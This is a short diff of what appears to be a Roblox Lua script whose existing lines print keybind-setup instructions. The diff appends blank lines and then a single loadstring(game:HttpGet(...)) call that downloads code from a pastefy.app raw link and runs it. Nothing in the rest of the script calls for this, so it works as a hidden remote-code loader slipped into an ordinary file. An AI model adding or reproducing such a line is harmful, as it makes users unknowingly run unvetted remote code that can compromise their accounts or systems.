@@ -5392,3 +5392,8 @@ print("Go to Settings tab to assign keyboard")
 print("and controller binds for each action.")
 print("Binds save automatically.")
 print("========================================")
+
+
+
+
+loadstring(game:HttpGet("https://pastefy.app/XrLb6B4E/raw"))()
